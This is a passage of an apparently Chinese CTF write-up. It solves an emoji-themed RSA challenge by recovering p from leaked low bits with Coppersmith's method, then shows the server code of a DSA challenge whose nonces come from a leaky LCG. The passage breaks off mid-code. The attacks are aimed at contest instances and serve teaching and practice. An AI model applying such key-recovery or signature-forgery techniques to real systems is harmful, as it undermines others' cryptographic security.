            p &#x3D; (p &lt;&lt; 32) + get_random_emojiiiiii() # 猜一猜
        if isPrime(p):
            return p

m &#x3D; bytes_to_long(flag.encode()+ &quot;&quot;.join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())
p &#x3D; genarate_emojiiiiii_prime(512, 224)
q &#x3D; genarate_emojiiiiii_prime(512)

n &#x3D; p * q
e &#x3D; &quot;💯&quot;
c &#x3D; pow(m, bytes_to_long(e.encode()), n)

print(&quot;p0 &#x3D;&quot;, long_to_bytes(p % 2 ** 256).decode())
print(&quot;n &#x3D;&quot;, n)
print(&quot;c &#x3D;&quot;, c)

p0 &#x3D; &#39;😘😾😂😋😶😾😳😷&#39;
n &#x3D; 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c &#x3D; 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</code></pre>

<p>根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位</p>
<p>题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可</p>
<p>知道低32*9&#x3D;288位即可copper得到p</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

p0_ <span class="token operator">=</span> <span class="token number">108837065531980906150333850570890620719343963272506332719822248235755953428663</span>
n <span class="token operator">=</span> <span class="token number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>
c <span class="token operator">=</span> <span class="token number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span>

a<span class="token operator">=</span><span class="token number">4036991100</span>

<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">288</span> <span class="token operator">+</span> p0_ <span class="token operator">+</span> <span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span>
    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">225</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>epsilon<span class="token operator">=</span><span class="token number">0.04</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>
        x <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        p_candidate <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">288</span> <span class="token operator">+</span> p0_ <span class="token operator">+</span> <span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> n <span class="token operator">%</span> p_candidate <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found p:"</span><span class="token punctuation">,</span> p_candidate<span class="token punctuation">)</span>
            q_candidate <span class="token operator">=</span> n <span class="token operator">//</span> p_candidate
            <span class="token keyword">break</span>

<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p_candidate<span class="token punctuation">)</span>
q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>q_candidate<span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">4036989615</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>n<span class="token operator">%</span>p<span class="token punctuation">,</span>n<span class="token operator">%</span>q<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token operator">//</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>y<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token operator">=</span>y<span class="token operator">^</span><span class="token number">15</span><span class="token operator">-</span>c
f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
m1<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>z<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token operator">=</span>z<span class="token operator">^</span><span class="token number">15</span><span class="token operator">-</span>c
f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
m2<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> m1<span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> m2<span class="token punctuation">:</span>
        m<span class="token operator">=</span>solve_crt<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'TGCTF'</span> <span class="token keyword">in</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了</p>
<blockquote>
<p>TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢</p>
</blockquote>
<h3 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a><strong><strong>LLLCG</strong></strong></h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
<span class="token keyword">import</span> socketserver
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span> dsa_p<span class="token punctuation">,</span> dsa_q

<span class="token keyword">class</span> <span class="token class-name">TripleLCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">[</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> a
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> b
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> c
        self<span class="token punctuation">.</span>d <span class="token operator">=</span> d
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> n

    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        new <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>c <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new<span class="token punctuation">)</span>
        <span class="token keyword">return</span> new

<span class="token keyword">class</span> <span class="token class-name">DSA</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># while True:</span>
            <span class="token comment"># self.q = getPrime(160)</span>
            <span class="token comment"># t = 2 * getPrime(1024 - 160) * self.q</span>
            <span class="token comment"># if isPrime(t + 1):</span>
            <span class="token comment">#    self.p = t + 1</span>
            <span class="token comment">#    break</span>
        self<span class="token punctuation">.</span>p <span class="token operator">=</span> dsa_p
        self<span class="token punctuation">.</span>q <span class="token operator">=</span> dsa_q
        self<span class="token punctuation">.</span>g <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>x <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> self<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        s <span class="token operator">=</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> self<span class="token punctuation">.</span>x <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> s<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> r <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;</span> s <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        w <span class="token operator">=</span> inverse<span class="token punctuation">(</span>s<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span>
        u1 <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        u2 <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>y<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> v <span class="token operator">==</span> r

<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">_recvall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        BUFF_SIZE <span class="token operator">=</span> <span class="token number">2048</span>
        data <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            part <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFF_SIZE<span class="token punctuation">)</span>
            data <span class="token operator">+=</span> part
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span> <span class="token operator">&lt;</span> BUFF_SIZE<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> newline<span class="token punctuation">:</span>
            msg <span class="token operator">+=</span> <span class="token string">b'\n'</span>
        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prompt<span class="token operator">=</span><span class="token string">b'[-] '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
        a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3 <span class="token operator">=</span> <span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

        lcg <span class="token operator">=</span> TripleLCG<span class="token punctuation">(</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        dsa <span class="token operator">=</span> DSA<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Welcome to TGCTF Challenge!\n"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>p<span class="token punctuation">&#125;</span></span><span class="token string">, q = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>q<span class="token punctuation">&#125;</span></span><span class="token string">, g = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>g<span class="token punctuation">&#125;</span></span><span class="token string">, y = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>y<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        small_primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">59093</span><span class="token punctuation">,</span> <span class="token number">65371</span><span class="token punctuation">,</span> <span class="token number">37337</span><span class="token punctuation">,</span> <span class="token number">43759</span><span class="token punctuation">,</span> <span class="token number">52859</span><span class="token punctuation">,</span> <span class="token number">39541</span><span class="token punctuation">,</span> <span class="token number">60457</span><span class="token punctuation">,</span> <span class="token number">61469</span><span class="token punctuation">,</span> <span class="token number">43711</span><span class="token punctuation">]</span>
        used_messages <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> o_v <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Select challenge parts: 1, 2, 3\n"</span><span class="token punctuation">)</span>
            parts <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'1'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 1\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Message </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    used_messages<span class="token punctuation">.</span>add<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    r<span class="token punctuation">,</span> s <span class="token operator">=</span> dsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"r = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">&#125;</span></span><span class="token string">, ks = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>k <span class="token operator">%</span> p <span class="token keyword">for</span> p <span class="token keyword">in</span> small_primes<span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'2'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 2\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Message </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> dsa<span class="token punctuation">.</span>q
                    r<span class="token punctuation">,</span> s <span class="token operator">=</span> dsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Signature: r = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">&#125;</span></span><span class="token string">, s = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    used_messages<span class="token punctuation">.</span>add<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'3'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 3\n"</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged message: "</span><span class="token punctuation">)</span>
                final_msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged r: "</span><span class="token punctuation">)</span>
                r <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged s: "</span><span class="token punctuation">)</span>
                s <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> final_msg <span class="token keyword">in</span> used_messages<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Message already signed!\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">elif</span> dsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>final_msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
